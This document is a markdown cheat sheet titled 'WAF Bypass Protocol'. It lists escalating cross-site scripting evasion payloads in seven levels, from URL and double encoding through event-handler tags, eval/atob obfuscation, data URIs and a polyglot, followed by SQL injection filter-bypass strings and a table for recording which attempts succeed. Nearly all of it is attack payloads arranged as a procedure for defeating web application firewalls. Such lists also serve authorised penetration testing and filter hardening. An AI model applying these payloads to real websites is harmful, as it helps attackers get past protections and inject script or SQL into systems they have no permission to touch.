# WAF Bypass Protocol

> 7-level escalation ladder. Only escalate when previous levels fail. Document every attempt.

## Level 1: Basic Encoding
```
URL encoding: %3Cscript%3E
Double encoding: %253Cscript%253E
Unicode: \u003cscript\u003e
HTML entities: &#60;script&#62;
```

## Level 2: Case Variation
```
<ScRiPt>
<SCRIPT>
<sCrIpT>
```

## Level 3: Null Bytes & Special Characters
```
<scr%00ipt>
<scr\x00ipt>
<scr%0d%0aipt>
```

## Level 4: Alternative Tags & Events
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<marquee onstart=alert(1)>
< input onfocus=alert(1) autofocus>
```

## Level 5: JavaScript Context Bypass
```
'+'-alert(1)+''
'+'-alert(1)+''
eval(atob('YWxlcnQoMSk='))
window['al'+'ert'](1)
```

## Level 6: Protocol & Data URIs
```
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
javascript:void(alert(1))
```

## Level 7: Advanced Evasion
```
Mutation XSS: <noscript><p title="</noscript><img src=x onerror=alert(1)>">
DOM clobbering: <a id=body><a id=name>
CSS injection: background:url(javascript:alert(1))
Polyglot: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
```

## SQLi WAF Bypass
```
/**/UNION/**/SELECT  (comment bypass)
UNION%09SELECT  (tab bypass)
UNION%0ASELECT  (newline bypass)
/*!50000UNION*/ /*!50000SELECT*/  (MySQL version)
'UnIoN'+'SeLeCt'  (concat)
%55%4E%49%4F%4E  (URL encode)
```

## Documentation Template
| Level | Technique | Payload | Result | Notes |
|-------|-----------|---------|--------|-------|
| 1 | URL encoding | `%3Cscript%3E` | Blocked | WAF detects encoding |
| 2 | Double encoding | `%253Cscript%253E` | Blocked | WAF decodes twice |
| 3 | Null byte | `<scr%00ipt>` | Success! | Null byte bypasses filter |
